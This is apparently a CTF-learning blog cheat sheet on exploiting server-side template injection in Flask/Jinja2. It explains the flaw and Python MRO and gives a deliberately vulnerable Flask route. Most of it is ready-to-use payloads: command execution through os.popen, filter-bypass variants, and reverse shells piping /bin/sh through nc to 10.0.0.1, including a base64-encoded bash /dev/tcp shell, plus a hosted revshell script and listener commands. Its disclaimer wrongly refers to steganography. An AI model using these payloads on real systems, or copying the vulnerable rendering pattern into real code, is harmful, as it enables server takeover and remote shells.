---
title: FLASK JINJA PENTESTING
date: 2023-07-12 09:00:40 +/-TTTT
categories: [learning, web]
tags: [ctf]     # TAG names should always be lowercase
---

Flask is a micro web framework written in Python.

# Common Directories

```
/app.py
/main.py
/modules.py
/modules/__init__.py
/modules/admin.py
```

# Server-Side Template Injection (SSTI)

A server side template injection is a vulnerability that occurs when a server renders user input as a template of some sort. Templates can be used when only minor details of a page need to change from circumstance to circumstance. For example, depending on the IP that accesses a site, the site may look like :

```py
<h1>Welcome to the page!</h1>
<u>This page is being accessed from the remote address: {{ip}}</u>
```

Instead of creating a whole new page per person that accesses the site, it will simply render the remote address into the ``{{ip}}`` variable, while reusing the rest of the HTML for each person request the server receives to that endpoint.

This can be abused, since some template engines support some fairly complex functionality, that eventually allow for developers to run commands or file contents straight from the template.

So when the power to create and render templates is given to a user, it can lead to full access to the system, as the user running the webserver.

# What is ‚ÄòMRO‚Äô?

MRO (Resolution Order method) is the order in which Python is looking for methods in class hierarchy. When an object of calling method, python will look for the compliance method in the sequence determined by MRO. This MRO sequence determines the order of inheritance of the class to be sought by Python.

Example : 

```py
class A:
    def process(self):
        print('A process()')

class B:
    def process(self):
        print('B process()')

class C(A, B):
    def process(self):
        print('C process()')

class D(C, B):
    pass

obj = D()
obj.process()

print(D.mro())
```

In this example, when `object D` calls the process method (), Python will look for the method in the MRO sequence. The output of the `print (D.Mro ())` will provide a MRO sequence for class D :

```py
[<class '__main__.D'>, <class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>, <class 'object'>]
```

This MRO sequence shows that the process `method ()` will be sought first in class `D`, then in class `C`, followed by `A, B`, and Object (basic class for all classes in Python).

By using MRO, we can understand the sequence of class inheritance and `identify which classes will be used in certain situations`. This is useful especially when using multiple inheritance or in the context of the construction of SSTI content with `Jinja2`.

```py
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
    if request.args.get('c'):
        return render_template_string(request.args.get('c'))
    else:
        return "Hi!!!"

if __name__ == "__main__":
    app.run(debug=True)
```

# Installation

* sudo apt-get install python-pip
* pip install flask --user
* python app.py


Sometimes, website may filter specific characters.
If so, URL encode the payload or convert to HEX.
In addition, it‚Äôs recommended to send requests using Burp Suite because web browsers automatically update the payload.

`Payload`
```py
{{ 4*2 }}
{{ config.items() }}
# Remove curly brackets
{2*3}
2*3
```

If success, you may be able to exploit with `OS command injection`.

```py
{{ __import__('os').system('ping -c 1 10.0.0.1') }}

{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}

{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}

{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}

{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
```

# RCE bypassing 

```py
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

#  waf blocks ‚Äú.‚Äù:
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}

# waf blocks ‚Äú.‚Äù and ‚Äú_‚Äù:
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}

# Bypassing the blocks on ‚Äú.‚Äù, ‚Äú_‚Äù, ‚Äú[]‚Äù and ‚Äú|join‚Äù
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Reverse Shell
{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.0.0.1 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}

{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f')|attr('read')() }}

# Filter bypass - Base64 encode
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEi" | base64 -d | bash').read() }}
```

Alternatively, we can create a shell script to reverse shell, then execute it in the server side.
For example, create a shell script named `revshell` in local machine.

```py
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
```

Then host it and start a listener for receiving an incoming request.

```py
# Local terminal 1
python3 -m http.server 8000

# Local terminal 2
nc -lvnp 4444
```

# DISCLAIMER
```
This cheatsheet is intended to guide CTF players in their research. This cheatsheet is not representative of modern steganography/seganalysis techniques, and its content does match with the creation of an interesting challenges üòâ.
```